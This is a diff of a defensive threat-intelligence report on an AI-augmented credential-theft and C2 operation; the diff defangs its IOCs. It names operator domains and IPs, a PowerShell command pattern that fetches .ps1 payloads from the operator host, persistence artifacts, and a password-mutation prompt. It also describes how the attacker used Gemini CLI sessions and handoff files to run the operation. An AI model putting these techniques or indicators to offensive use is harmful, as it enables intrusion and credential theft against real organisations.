@@ -21,15 +21,15 @@ detection_sections:
   - label: "Suricata Signatures"
     anchor: "#suricata-signatures"
 ioc_highlights:
-  - "213.165.51.115"
-  - "tralalarkefe.com"
-  - "windows_server.tralalarkefe.com"
-  - "c2.tralalarkefe.com"
-  - "payloads.tralalarkefe.com"
+  - "213[.]165[.]51[.]115"
+  - "tralalarkefe[.]com"
+  - "windows_server.tralalarkefe[.]com"
+  - "c2[.]tralalarkefe[.]com"
+  - "payloads[.]tralalarkefe[.]com"
 stix_bundle: /stix/russian-gemini-credential-mill-213.165.51.115.json
 ---
 
-**Campaign Identifier:** Russian-Gemini-Credential-Mill-UTA-2026-012-213.165.51.115<br>
+**Campaign Identifier:** Russian-Gemini-Credential-Mill-UTA-2026-012-213[.]165[.]51[.]115<br>
 **Last Updated:** May 25, 2026<br>
 **Threat Level:** CRITICAL
 
@@ -57,7 +57,7 @@ Each finding below names its home section, where the evidence and confidence lab
 
 - **A multi-component AI-augmented credential mill** built and operated by one Russian-native actor: the LLM password mutator, stolen-key validation pipeline, unauthenticated stdlib C2, paid breach-data integration, and Telegram IO bot are dissected in §4.
 - **A four-node GCP cloud overlay tied to a victim-named project.** Operator-owned project `[victim-named GCP project, redacted]` (named after the victim, a low-OPSEC tell of dedicated focus), three instances, and one service account linking them (§4.7).
-- **A Cloudflare Tunnel topology under operator-owned `tralalarkefe.com`**: operator-owned zone, captured full-admin API token, and six tunnel subdomains (two of them victim-side RDP/SSH) plus one ephemeral bootstrap tunnel (§4.5).
+- **A Cloudflare Tunnel topology under operator-owned `tralalarkefe[.]com`**: operator-owned zone, captured full-admin API token, and six tunnel subdomains (two of them victim-side RDP/SSH) plus one ephemeral bootstrap tunnel (§4.5).
 - **Three AI Operator Handoff Documents**: operator-authored Markdown addressed to a Gemini CLI consumer, structurally distinct from the `GEMINI.md` jailbreak-persistence class Trend Micro documented (§4.2, §5.3).
 - **An active HIPAA-regulated US healthcare compromise** (US dental practice) with full local NTLM hash inventory, OpenDental MySQL root hash, and operator-controlled RDP+SSH tunnels operational at capture time (§4.6). HC3 plus direct practice notification is the Tier-0 disclosure path.
 
@@ -88,11 +88,11 @@ This is an active, actively-iterating, named-victim-confirmed credential mill ca
 <tr><th>Risk Dimension</th><th>Score</th><th>Rationale</th></tr>
 </thead>
 <tbody>
-<tr><td>Active Victim Compromise</td><td>10/10</td><td>the US dental-practice victim with HIPAA-regulated PHI exposure: full local NTLM hash inventory captured (6 hashes), OpenDental MySQL root password hash captured, two internal subnets compromised, operator-controlled Cloudflare Tunnel RDP+SSH access (`windows_server.tralalarkefe.com` and `gil_dr1.tralalarkefe.com`) configured at the moment of capture. PHI breach timeline is active pending tunnel teardown by Cloudflare PSIRT.</td></tr>
-<tr><td>Credential Theft Capability</td><td>9/10</td><td>LLM-Personalized Credential Mutation pipeline (`ai_sniper_brute.py`) generates 20 likely current password mutations per target via Gemini 2.5 Flash. A measurable evolution beyond static hashcat rules. Combined with AntiPublic.one paid breach-data subscription (6.56B records per service description), mass WordPress validation rig (~30,000 sites targeted via `nuclei` mega-hunt log of 38.7 MB), and 40+ stolen Gemini API keys (frontier-LLM compute theft), the operator's credential-attack throughput is meaningfully higher than commodity credential-stuffing baseline.</td></tr>
-<tr><td>Persistence Capability</td><td>8/10</td><td>Cloudflare Tunnel over operator-owned custom domain `tralalarkefe.com` (more persistent than ephemeral `trycloudflare.com` quick-tunnel abuse, domain stability enables post-migration agent reconnection). HKCU Run-key persistence (`WindowsUpdateManager`) on victim hosts plus `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1` PowerShell beacon. Inferred WMI Event Subscription persistence (`stealth.ps1` fileless pattern, MODERATE confidence).</td></tr>
-<tr><td>Detection Evasion</td><td>7/10</td><td>Multi-instance C2 deployment (concurrent ports 8081/8090/10101 on `tralalarkefe.com` subdomains) provides resilience against single-port blocking. Base64(UTF-16LE) body encoding on C2 traffic. PowerShell `SecurityProtocol = Tls12` precondition before `Invoke-RestMethod` against `payloads.tralalarkefe.com`. Cloudflare Tunnel fronting provides TLS SNI and IP-based block evasion. `213.165.51.115` VT detection is 1/91 (low visibility, operator workstation, not victim-facing C2, Cloudflare/GCP handles victim-facing traffic).</td></tr>
-<tr><td>Concurrent R&D Tempo</td><td>9/10</td><td>122 Gemini CLI session JSONs span multiple operational threads spanning 2026-03-19 to 2026-03-30; `min1.sh` and other operator-built tooling Last Modified during the investigation window. `/api/v1/get_results` endpoint mismatch is direct evidence of in-place iterative development against a live victim. Open-directory exposure on `213.165.51.115` cleaned (totalItems: 0 by 2026-05-23), operator detected and responded to exposure within days.</td></tr>
+<tr><td>Active Victim Compromise</td><td>10/10</td><td>the US dental-practice victim with HIPAA-regulated PHI exposure: full local NTLM hash inventory captured (6 hashes), OpenDental MySQL root password hash captured, two internal subnets compromised, operator-controlled Cloudflare Tunnel RDP+SSH access (`windows_server.tralalarkefe[.]com` and `gil_dr1.tralalarkefe[.]com`) configured at the moment of capture. PHI breach timeline is active pending tunnel teardown by Cloudflare PSIRT.</td></tr>
+<tr><td>Credential Theft Capability</td><td>9/10</td><td>LLM-Personalized Credential Mutation pipeline (`ai_sniper_brute.py`) generates 20 likely current password mutations per target via Gemini 2.5 Flash. A measurable evolution beyond static hashcat rules. Combined with AntiPublic[.]one paid breach-data subscription (6.56B records per service description), mass WordPress validation rig (~30,000 sites targeted via `nuclei` mega-hunt log of 38.7 MB), and 40+ stolen Gemini API keys (frontier-LLM compute theft), the operator's credential-attack throughput is meaningfully higher than commodity credential-stuffing baseline.</td></tr>
+<tr><td>Persistence Capability</td><td>8/10</td><td>Cloudflare Tunnel over operator-owned custom domain `tralalarkefe[.]com` (more persistent than ephemeral `trycloudflare[.]com` quick-tunnel abuse, domain stability enables post-migration agent reconnection). HKCU Run-key persistence (`WindowsUpdateManager`) on victim hosts plus `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1` PowerShell beacon. Inferred WMI Event Subscription persistence (`stealth.ps1` fileless pattern, MODERATE confidence).</td></tr>
+<tr><td>Detection Evasion</td><td>7/10</td><td>Multi-instance C2 deployment (concurrent ports 8081/8090/10101 on `tralalarkefe[.]com` subdomains) provides resilience against single-port blocking. Base64(UTF-16LE) body encoding on C2 traffic. PowerShell `SecurityProtocol = Tls12` precondition before `Invoke-RestMethod` against `payloads[.]tralalarkefe[.]com`. Cloudflare Tunnel fronting provides TLS SNI and IP-based block evasion. `213[.]165[.]51[.]115` VT detection is 1/91 (low visibility, operator workstation, not victim-facing C2, Cloudflare/GCP handles victim-facing traffic).</td></tr>
+<tr><td>Concurrent R&D Tempo</td><td>9/10</td><td>122 Gemini CLI session JSONs span multiple operational threads spanning 2026-03-19 to 2026-03-30; `min1.sh` and other operator-built tooling Last Modified during the investigation window. `/api/v1/get_results` endpoint mismatch is direct evidence of in-place iterative development against a live victim. Open-directory exposure on `213[.]165[.]51[.]115` cleaned (totalItems: 0 by 2026-05-23), operator detected and responded to exposure within days.</td></tr>
 <tr><td>Cross-Domain Operator Profile</td><td>8/10</td><td>Concurrent financial cybercrime (credential mill against US healthcare) and political IO (`@americanpatriotus` "Quantum Patriot" Telegram disinformation) from the same operator infrastructure. 17,000-subscriber channel active since 2021 (5-year campaign per Trend Micro). AI augmentation via Gemini CLI for political content posting (live session 2026-03-25T18-27 with anti-fraud / JD-Vance themed content captured). Solo-actor cross-domain combination is rare in published reporting, typically attributed to coordinated teams.</td></tr>
 </tbody>
 </table>
@@ -107,8 +107,8 @@ This is a single-operator case. The actor is tracked as **<a href="/actors/UTA-2
 
 Five immediate priorities for SOC analysts, threat hunters, and healthcare-sector defenders:
 
-1. **Block egress to `*.tralalarkefe.com` and the operator IP inventory.** TLS SNI block + DNS block + IP block (`213.165.51.115`, `34.34.81.129`, `34.34.57.141`, `35.192.41.201`). Egress hunt for `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) + X-Agent-ID header + /api/v1/* URI` regardless of domain, the `X-Agent-ID` header format (`HOSTNAME_user`, e.g., `HOSTNAME_staff`) is bespoke to this operator and is the highest-signal single network detection string. Detection rules in Section 10.
-2. **Audit HKCU Run-key + `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1`.** Any presence of either is HIGH-confidence indication of this operator on the host. Cross-check for PowerShell process with `SecurityProtocol = Tls12` precondition before `Invoke-RestMethod -Uri https://payloads.tralalarkefe.com/*.ps1`.
+1. **Block egress to `*.tralalarkefe[.]com` and the operator IP inventory.** TLS SNI block + DNS block + IP block (`213[.]165[.]51[.]115`, `34[.]34[.]81[.]129`, `34[.]34[.]57[.]141`, `35[.]192[.]41[.]201`). Egress hunt for `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) + X-Agent-ID header + /api/v1/* URI` regardless of domain, the `X-Agent-ID` header format (`HOSTNAME_user`, e.g., `HOSTNAME_staff`) is bespoke to this operator and is the highest-signal single network detection string. Detection rules in Section 10.
+2. **Audit HKCU Run-key + `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1`.** Any presence of either is HIGH-confidence indication of this operator on the host. Cross-check for PowerShell process with `SecurityProtocol = Tls12` precondition before `Invoke-RestMethod -Uri hxxps://payloads[.]tralalarkefe[.]com/*.ps1`.
 3. **Audit US healthcare and dental practices for `[victim AD domain, redacted]` AD artifacts and OpenDental installations.** This is the primary victim, but the TTP set applies directly to any small US healthcare practice with a similar attack surface, under-resourced security posture, commodity AD environment, and OpenDental or comparable vertical practice-management software.
 4. **Hunt for the LLM credential mutation YARA signature.** YARA rule covers the `"Act as an expert red-team password analyst"` + Gemini API import + `AI_SNIPER_GOODS.txt` / `AI_ADMIN_MUTANTS.txt` output filename pattern. Endpoint AV/EDR file scan plus git-hook pre-commit scan on internal CI/CD pipelines (in case this tooling spreads).
 5. **Hunt for AI Operator Handoff Document YARA signature on developer workstations and server-class hosts.** YARA rule covers Markdown files with session-start load directive co-occurring with C2 endpoint references or credential-table indicators. Higher-risk locations: `~/.gemini/`, `~/.claude/`, `~/.codex/` directories on server-class Linux hosts.
@@ -127,8 +127,8 @@ This is not a one-off attack but an active credential mill with a named US healt
 
 The captured arsenal tells defenders what the operator does with a successful compromise. Four operational outcomes are observable in the captured artifacts:
 
-1. **Credential theft scaled by LLM personalization.** The `ai_sniper_brute.py` Gemini-augmented mutator generates 20 likely current password mutations per target using email, domain, and any known prior password as input: a measurable evolution beyond static hashcat rules. Combined with the AntiPublic.one paid breach-data subscription (6.56B records per service description) and the mass WordPress validation rig (38.7 MB nuclei mega-hunt log targeting ~30,000 sites), the operator's credential-attack throughput is meaningfully higher than commodity credential-stuffing baseline.
-2. **Persistent victim-side remote access via Cloudflare Tunnel.** Operator-controlled Cloudflare Tunnel subdomains (`windows_server.tralalarkefe.com` for RDP/WinRM and `gil_dr1.tralalarkefe.com` for SSH) provide persistent inbound access to the victim hosts without the operator needing to maintain victim-side reverse-shell infrastructure or expose victim hosts directly. The tunnels are still configured at capture time.
+1. **Credential theft scaled by LLM personalization.** The `ai_sniper_brute.py` Gemini-augmented mutator generates 20 likely current password mutations per target using email, domain, and any known prior password as input: a measurable evolution beyond static hashcat rules. Combined with the AntiPublic[.]one paid breach-data subscription (6.56B records per service description) and the mass WordPress validation rig (38.7 MB nuclei mega-hunt log targeting ~30,000 sites), the operator's credential-attack throughput is meaningfully higher than commodity credential-stuffing baseline.
+2. **Persistent victim-side remote access via Cloudflare Tunnel.** Operator-controlled Cloudflare Tunnel subdomains (`windows_server.tralalarkefe[.]com` for RDP/WinRM and `gil_dr1.tralalarkefe[.]com` for SSH) provide persistent inbound access to the victim hosts without the operator needing to maintain victim-side reverse-shell infrastructure or expose victim hosts directly. The tunnels are still configured at capture time.
 3. **Cross-domain political IO from the same infrastructure.** The `@americanpatriotus` "Quantum Patriot" Telegram channel is posted to via Gemini CLI sessions from the same operator filesystem (live session captured 2026-03-25T18-27 with anti-fraud / JD-Vance themed content). Solo-actor cross-domain financial cybercrime + political IO is rare in published reporting: DFRLab and OpenMinds document Russian-operated US-targeted Telegram networks at scale but typically attribute these to coordinated teams.
 4. **Frontier-LLM compute theft.** The operator inventory-tracks 40+ stolen Gemini keys (plus one OpenAI and one Venice AI key) by MD5 hash, rotating them through `check_keys.py` / `test_gemini_3.1.py` / `retest_keys.py`. It is theft of commercial AI compute: the cost lands on each key-holder's billing account.
 
@@ -144,13 +144,13 @@ The following scenarios are derived from observed operator capabilities and infr
 | LLM-Personalized Credential Mutation tradecraft diffuses to other operators | HIGH | The verbatim prompt template in `ai_sniper_brute.py` is approximately 8 lines of straightforward natural-language instructions. Trend Micro's independent confirmation of the operational pattern in the same week as this report suggests the technique is already in early diffusion across the Russian-speaking cybercrime ecosystem. Defender preparation for the broader class of LLM-augmented credential attacks is warranted. |
 | `@americanpatriotus` posts amplify into broader Russian-disinfo Telegram network | MODERATE | DFRLab and OpenMinds document 52-channel Russian-operated US-targeted Telegram conduit networks; whether `@americanpatriotus` feeds into those networks is unknown without DFRLab-methodology content analysis. The 17,000-subscriber base (per Trend Micro) and the 5-year operational history (since 2021) place the channel within plausible amplification range. |
 | GCP project `[victim-named GCP project, redacted]` provides law enforcement attribution anchor | HIGH | Operator-named GCP project carries the victim's name; the GCP service account email (`geminicli@elated-gizmo-491112-k0...`) is billing-account-associated. This is the cleanest subpoena-grade identity path for US law enforcement engagement. |
-| AntiPublic.one paid subscription (JWT `sub:31703`) provides operator-account identity path | MODERATE | AntiPublic.one is a commercial breach-data service with operator-bound account records. JWT `sub:31703` is the operator's user identifier. Whether AntiPublic.one will cooperate with disclosure is unknown, the service operates in a grey-area jurisdiction. |
+| AntiPublic[.]one paid subscription (JWT `sub:31703`) provides operator-account identity path | MODERATE | AntiPublic[.]one is a commercial breach-data service with operator-bound account records. JWT `sub:31703` is the operator's user identifier. Whether AntiPublic[.]one will cooperate with disclosure is unknown, the service operates in a grey-area jurisdiction. |
 
 ### Operational Impact Timeline (If Your Organization Is the Victim)
 
 The phases below describe **categories of work** required to investigate and remediate, in priority order. Per The Hunters Ledger's third-party intelligence provider perspective, no organization-specific procedures, vendor-product configurations, compliance timelines, or cost estimates are included, those decisions belong to the responding organization's incident response team and outside counsel.
 
-- **Initial Phase: Confirm operator access posture and contain inbound tunnels.** Verify whether `cloudflared` is running on any internal host (process inventory + executable-path search); verify outbound TLS connections to `*.tralalarkefe.com` SNI (perimeter TLS logging); audit HKCU Run-key `WindowsUpdateManager` and `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1` presence; capture any beacon binaries for forensic preservation. Block egress to `*.tralalarkefe.com` and the operator IP inventory at perimeter; if `cloudflared` is running internally, kill the process and remove the persistence artifact only after capturing the process command-line and tunnel UUID for forensic preservation.
+- **Initial Phase: Confirm operator access posture and contain inbound tunnels.** Verify whether `cloudflared` is running on any internal host (process inventory + executable-path search); verify outbound TLS connections to `*.tralalarkefe[.]com` SNI (perimeter TLS logging); audit HKCU Run-key `WindowsUpdateManager` and `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1` presence; capture any beacon binaries for forensic preservation. Block egress to `*.tralalarkefe[.]com` and the operator IP inventory at perimeter; if `cloudflared` is running internally, kill the process and remove the persistence artifact only after capturing the process command-line and tunnel UUID for forensic preservation.
 - **Investigation Phase: Identify scope of credential and data exposure.** Hunt for credential dumping evidence (LSASS access, SAM hive access, NTDS.dit access); inventory the AD environment for the captured NTLM hash matches; review OpenDental MySQL access logs if applicable; review egress data volume against the time window the tunnels were configured (this defines the PHI exposure window for any HIPAA notification calculus). Hunt the email environment for any artifacts of `ai_sniper_brute.py`-class credential reuse against employee personal-email accounts.
 - **Notification Phase: Notify the victim class and engage the sector CERT.** HIPAA Breach Notification Rule applies if PHI exposure is confirmed; HC3 (HHS Health Sector Cybersecurity Coordination Center) is the appropriate sector-CERT coordination path. Direct practice notification of any patients whose PHI is confirmed exposed is required by HIPAA. The specific timeline, scope, and method are organization-and-counsel decisions outside the scope of this report.
 - **Remediation Phase: Rotate the full credential inventory and rebuild affected hosts.** Given the captured credential inventory + the LLM-personalized mutation pipeline, defensible remediation is full credential rotation for any captured account (the 6 NTLM hashes + the OpenDental MySQL root + any plaintext captured passwords) plus rotation of credentials accessed *from* affected hosts (cloud SaaS, banking, payroll, etc., per session-evidence inventory). Endpoint rebuild from known-good media is the defensible position for any host with confirmed operator access.
@@ -178,13 +178,13 @@ The arsenal is an operator-built composite: a custom Python-stdlib C2, an LLM-pe
 <tbody>
 <tr><td>Operation Type</td><td>AI-augmented credential mill + persistent victim-side remote access + co-located US-targeted political disinformation operation</td><td>DEFINITE</td></tr>
 <tr><td>Primary Family</td><td>Custom-Python-A2A-C2 + Gemini-CLI-Augmented-Credential-Mill (operator-built composite tooling)</td><td>DEFINITE</td></tr>
-<tr><td>Component Inventory</td><td>(1) Custom Python stdlib HTTP C2 server (`c2_server.py`); (2) PowerShell beacon (`agent_final.ps1`) with inferred Quasar-fork lineage (MODERATE, see §5.4); (3) LLM-personalized credential mutator (`ai_sniper_brute.py`); (4) Stolen LLM API key validator (`check_keys.py` + companion `test_gemini_3.1.py` + `retest_keys.py`); (5) AntiPublic.one paid integration (`mass_wp_mutator.py`); (6) Mass WordPress validation rig (`nuclei` with operator-bespoke `wp_admin_hunter.yaml` template); (7) Telegram disinformation automation (`quantum_patriot.py`)</td><td>DEFINITE</td></tr>
+<tr><td>Component Inventory</td><td>(1) Custom Python stdlib HTTP C2 server (`c2_server.py`); (2) PowerShell beacon (`agent_final.ps1`) with inferred Quasar-fork lineage (MODERATE, see §5.4); (3) LLM-personalized credential mutator (`ai_sniper_brute.py`); (4) Stolen LLM API key validator (`check_keys.py` + companion `test_gemini_3.1.py` + `retest_keys.py`); (5) AntiPublic[.]one paid integration (`mass_wp_mutator.py`); (6) Mass WordPress validation rig (`nuclei` with operator-bespoke `wp_admin_hunter.yaml` template); (7) Telegram disinformation automation (`quantum_patriot.py`)</td><td>DEFINITE</td></tr>
 <tr><td>Sophistication</td><td>Mid-tier with selective sophistication, sophisticated Cloudflare custom-domain Tunnel topology + GCP multi-instance overlay + AI workflow integration; rough OPSEC on plaintext credentials, victim-named GCP project, open-directory exposure; incomplete C2 implementation (in-place iterative dev)</td><td>HIGH</td></tr>
 <tr><td>Threat Actor Type</td><td>Solo operator or small criminal team, financially-motivated cybercrime + co-located political IO</td><td>HIGH</td></tr>
 <tr><td>Primary Motivation</td><td>Financial primary (credential theft + healthcare data + ransomware-prep capability); influence secondary (`@americanpatriotus` Telegram channel)</td><td>HIGH</td></tr>
 <tr><td>Target Profile</td><td>Opportunistic small-business WordPress (~30,000 sites validated via nuclei) + selective US healthcare (the US dental-practice victim, named target with victim-named GCP project signal); US-domestic political audience for the Telegram disinformation side track</td><td>DEFINITE</td></tr>
-<tr><td>Geographic Origin</td><td>Russian-native operator (DEFINITE via informal idiom register `Бро` / `братух` / `Погнали` / `тачка` / `Комп Доктора` plus Cyrillic-English technical bilingualism plus in-session credential ledger format `Формат: Имя тачки - Юзер - Пароль`); AEZA bulletproof-adjacent hosting preference; duty-free.cc Russian carding forum context</td><td>HIGH</td></tr>
-<tr><td>Campaign Complexity</td><td>Multi-tool, custom C2 + 3-stage AI integration (key validation + role-prime mutation + handoff documents) + commodity-service procurement (nuclei, AntiPublic.one) + cross-domain disinformation operation</td><td>HIGH</td></tr>
+<tr><td>Geographic Origin</td><td>Russian-native operator (DEFINITE via informal idiom register `Бро` / `братух` / `Погнали` / `тачка` / `Комп Доктора` plus Cyrillic-English technical bilingualism plus in-session credential ledger format `Формат: Имя тачки - Юзер - Пароль`); AEZA bulletproof-adjacent hosting preference; duty-free[.]cc Russian carding forum context</td><td>HIGH</td></tr>
+<tr><td>Campaign Complexity</td><td>Multi-tool, custom C2 + 3-stage AI integration (key validation + role-prime mutation + handoff documents) + commodity-service procurement (nuclei, AntiPublic[.]one) + cross-domain disinformation operation</td><td>HIGH</td></tr>
 <tr><td>Cross-Vendor Naming</td><td>The Hunters Ledger: <a href="/actors/UTA-2026-012/">UTA-2026-012</a>; Trend Micro (TrendAI Research) "Patriot Bait" 2026-05-22: bandcampro. DEFINITE 5-point IOC cross-match</td><td>DEFINITE</td></tr>
 </tbody>
 </table>
@@ -195,17 +195,17 @@ The operator spreads the infrastructure across three providers, AEZA (workstatio
 
 | Component | Identifier | ASN / Provider | Role |
 |---|---|---|---|
-| Operator workstation | `213.165.51.115` | AS210644, AEZA Group LLC (OFAC-sanctioned 2025-07-01) | Operator-side filesystem + open-directory exposure capture point |
-| GCP Ghost Proxy (NL) | `34.34.57.141` | AS15169, Google Cloud Platform | Operator proxy; all GCP logging explicitly disabled (deliberate OPSEC) |
-| GCP Mailpit (US) | `35.192.41.201` | AS15169, Google Cloud Platform | Operator mail test instance |
-| GCP Windows C2 (NL) | `34.34.81.129` | AS15169, Google Cloud Platform | Windows-side C2 instance |
-| Cloudflare custom domain | `tralalarkefe.com` (zone `6d415863...18f47af5`) | Cloudflare (operator-controlled API token captured) | Operator-owned custom domain fronting six C2 / payload / victim-access tunnel subdomains |
-| C2 API subdomain | `c2.tralalarkefe.com` | Cloudflare Tunnel | `/api/v1/*` endpoint family |
-| Payload distribution | `payloads.tralalarkefe.com` | Cloudflare Tunnel | `.ps1` payload download (e.g., `run_bg.ps1`) |
-| Victim RDP/WinRM access | `windows_server.tralalarkefe.com` | Cloudflare Tunnel | Operator-controlled persistent access into the victim Windows hosts |
-| Victim SSH access | `gil_dr1.tralalarkefe.com` | Cloudflare Tunnel | Operator-controlled persistent SSH access |
-| Ephemeral bootstrap | `tenant-upcoming-great-descending.trycloudflare.com` | Cloudflare quick-tunnel | One-time payload bundle delivery; cannot be pre-blocked at domain level |
-| Paid breach-data API | `antipublic.one` | (external commercial service) | Operator-integrated paid subscription (JWT `jti:44298` / `sub:31703`) |
+| Operator workstation | `213[.]165[.]51[.]115` | AS210644, AEZA Group LLC (OFAC-sanctioned 2025-07-01) | Operator-side filesystem + open-directory exposure capture point |
+| GCP Ghost Proxy (NL) | `34[.]34[.]57[.]141` | AS15169, Google Cloud Platform | Operator proxy; all GCP logging explicitly disabled (deliberate OPSEC) |
+| GCP Mailpit (US) | `35[.]192[.]41[.]201` | AS15169, Google Cloud Platform | Operator mail test instance |
+| GCP Windows C2 (NL) | `34[.]34[.]81[.]129` | AS15169, Google Cloud Platform | Windows-side C2 instance |
+| Cloudflare custom domain | `tralalarkefe[.]com` (zone `6d415863...18f47af5`) | Cloudflare (operator-controlled API token captured) | Operator-owned custom domain fronting six C2 / payload / victim-access tunnel subdomains |
+| C2 API subdomain | `c2[.]tralalarkefe[.]com` | Cloudflare Tunnel | `/api/v1/*` endpoint family |
+| Payload distribution | `payloads[.]tralalarkefe[.]com` | Cloudflare Tunnel | `.ps1` payload download (e.g., `run_bg.ps1`) |
+| Victim RDP/WinRM access | `windows_server.tralalarkefe[.]com` | Cloudflare Tunnel | Operator-controlled persistent access into the victim Windows hosts |
+| Victim SSH access | `gil_dr1.tralalarkefe[.]com` | Cloudflare Tunnel | Operator-controlled persistent SSH access |
+| Ephemeral bootstrap | `tenant-upcoming-great-descending[.]trycloudflare[.]com` | Cloudflare quick-tunnel | One-time payload bundle delivery; cannot be pre-blocked at domain level |
+| Paid breach-data API | `antipublic[.]one` | (external commercial service) | Operator-integrated paid subscription (JWT `jti:44298` / `sub:31703`) |
 
 ### Why This Is Distinct From Commodity Cybercrime Tooling
 
@@ -213,7 +213,7 @@ Three structural features mark this operator's arsenal as distinct from the comm
 
 - **Operator-authored components.** The C2 server, the LLM credential mutator, the LLM key validator, the mass WordPress validation harness, and the Telegram posting automation are all operator-built Python: not commodity off-the-shelf tooling. Hashcat-rules + commodity stuffer baselines do not include LLM personalization; the `ai_sniper_brute.py` source is a measurable evolution beyond that baseline.
 - **AI-augmented orchestration.** The three AI Operator Handoff Documents represent a state-of-art tradecraft pattern where the operator uses Gemini CLI as an active operational assistant, with structured handoff documents that re-prime new AI sessions with prior session state. This is a level above the documented `GEMINI.md` jailbreak-persistence pattern (which is content-level persistence inside a single file the AI auto-loads): the operator's three documents are operational-state-bearing handoffs with explicit AI-to-AI headers.
-- **Persistent victim-side remote access via legitimate-provider tunneling.** Cloudflare Tunnel over operator-owned custom domain provides persistence beyond the documented `trycloudflare.com` quick-tunnel abuse pattern (Proofpoint 2024-08-01 RAT coverage). The custom-domain Tunnel survives quick-tunnel teardown and enables post-migration agent reconnection.
+- **Persistent victim-side remote access via legitimate-provider tunneling.** Cloudflare Tunnel over operator-owned custom domain provides persistence beyond the documented `trycloudflare[.]com` quick-tunnel abuse pattern (Proofpoint 2024-08-01 RAT coverage). The custom-domain Tunnel survives quick-tunnel teardown and enables post-migration agent reconnection.
 
 The combination of these three features defines the operator's class: **AI-augmented mid-tier solo cybercrime operator**, a class that Trend Micro's "One Man, One AI, One Fake Persona" framing captures, and that I further document here at artifact level.
 
@@ -229,9 +229,9 @@ Every link in the operator's chain (credential acquisition, LLM personalization,
 >
 > **Business Risk:** CRITICAL. Active HIPAA-regulated US healthcare compromise (the healthcare victim) with operator-controlled Cloudflare Tunnel RDP+SSH configured at capture time. LLM-Personalized Credential Mutation pipeline is a measurable evolution beyond static hashcat-rules baseline and will diffuse to other operators.
 >
-> **Detection Difficulty:** MEDIUM. Operator-bespoke strings (`X-Agent-ID` header, `A2A C2 MULTI-AGENT CONSOLE` banner, `[+++ AI SUPER GOOD +++]` success marker, the verbatim role-prime prompt) provide high-signal single-artifact detection points. Cloudflare Tunnel transport provides TLS SNI evasion vs. IP blocking; custom-domain `tralalarkefe.com` provides domain stability beyond ephemeral `trycloudflare.com` abuse.
+> **Detection Difficulty:** MEDIUM. Operator-bespoke strings (`X-Agent-ID` header, `A2A C2 MULTI-AGENT CONSOLE` banner, `[+++ AI SUPER GOOD +++]` success marker, the verbatim role-prime prompt) provide high-signal single-artifact detection points. Cloudflare Tunnel transport provides TLS SNI evasion vs. IP blocking; custom-domain `tralalarkefe[.]com` provides domain stability beyond ephemeral `trycloudflare[.]com` abuse.
 >
-> **Remediation Complexity:** HIGH for confirmed victims. Persistent Cloudflare Tunnel access requires both perimeter blocks (egress to `*.tralalarkefe.com`, IP blocks) AND endpoint-side `cloudflared` process termination AND credential rotation across the full captured credential inventory. Full host rebuild defensible for any host with confirmed operator access.
+> **Remediation Complexity:** HIGH for confirmed victims. Persistent Cloudflare Tunnel access requires both perimeter blocks (egress to `*.tralalarkefe[.]com`, IP blocks) AND endpoint-side `cloudflared` process termination AND credential rotation across the full captured credential inventory. Full host rebuild defensible for any host with confirmed operator access.
 >
 > **Key Takeaway:** This is the first publicly-documented complete operator-side AI-orchestrated credential mill with operator-authored structured handoff documents. The novelty is not Gemini CLI itself, it's the operator's structured, persistent, AI-to-AI documentation pattern for re-priming new sessions with operational state.
 
@@ -247,7 +247,7 @@ Every link in the operator's chain (credential acquisition, LLM personalization,
 | the healthcare-victim compromise (HIPAA) | CRITICAL, active HIPAA breach timeline | LOW, operator-owned tunnel SNI is unambiguous on victim egress | DEFINITE |
 | Multi-platform operator infrastructure (AEZA + GCP + Cloudflare) | HIGH, sovereignty-diversified C2 relay | MEDIUM, GCP attribution requires service account email match | DEFINITE |
 | Co-located Telegram disinfo operation (`@americanpatriotus`) | HIGH, cross-domain operator signal | LOW, Telegram channel + Quantum Patriot branding | DEFINITE |
-| Commodity service procurement (AntiPublic.one + nuclei + stealer logs) | MEDIUM, commercial-tier operator affiliation | MEDIUM, egress to `antipublic.one/api/v2/search` | DEFINITE |
+| Commodity service procurement (AntiPublic[.]one + nuclei + stealer logs) | MEDIUM, commercial-tier operator affiliation | MEDIUM, egress to `antipublic[.]one/api/v2/search` | DEFINITE |
 
 <details markdown="1" class="hl-teardown">
 <summary>All nine capabilities in full, from the LLM-mutation pipeline through the commodity procurement layer. Click to expand.</summary>
@@ -305,7 +305,7 @@ Each document follows a similar structural form:
 - Operational content block (C2 endpoint topology, tool path inventory, credential references)
 - Optional next-steps section for the AI consumer
 
-The first exemplar is `C2_INFRA_TRANSFER.md`, whose header carries the literal `**To:** Gemini CLI` and `**From:** Gemini CLI` strings. The body documents the operator's current C2 topology (the `tralalarkefe.com` tunnel inventory, the GCP instance roles, the AntiPublic.one integration endpoint). The intended use case is: operator opens a new Gemini CLI session, references this file in the first turn, and the AI is primed with full C2 state without the operator needing to re-explain context.
+The first exemplar is `C2_INFRA_TRANSFER.md`, whose header carries the literal `**To:** Gemini CLI` and `**From:** Gemini CLI` strings. The body documents the operator's current C2 topology (the `tralalarkefe[.]com` tunnel inventory, the GCP instance roles, the AntiPublic[.]one integration endpoint). The intended use case is: operator opens a new Gemini CLI session, references this file in the first turn, and the AI is primed with full C2 state without the operator needing to re-explain context.
 
 The second is `DEPLOYED_TOOLS.md`, where the session-start load directive `When starting a new session, refer to this file` is explicit. The body inventories the operator-built tooling (`ai_sniper_brute.py`, `check_keys.py`, `c2_server.py`, etc.) with file paths, purpose summaries, and operational notes (which targets each tool was last run against, which Gemini API key was last used).
 
@@ -373,7 +373,7 @@ The active-test script `test_gemini_3.1.py` runs a per-key test of the operator'
 
 The retest script `retest_keys.py` reactivates previously rate-limited keys after a cooldown window. The operator's GitHub repository `oravepo546-stack/Gemini-CLI-api-key-rotation` provides the same logic in a more polished, publicly published form.
 
